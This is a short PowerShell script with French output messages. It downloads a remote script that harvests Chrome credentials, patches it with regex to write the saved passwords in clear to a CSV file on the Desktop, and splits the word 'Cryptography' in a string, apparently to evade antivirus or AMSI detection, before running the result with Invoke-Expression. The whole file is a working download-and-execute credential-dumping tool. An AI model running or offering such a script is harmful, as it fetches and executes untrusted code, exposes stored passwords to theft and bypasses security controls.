$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1' -UseBasicParsing).Content
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Invoke-Expression $c
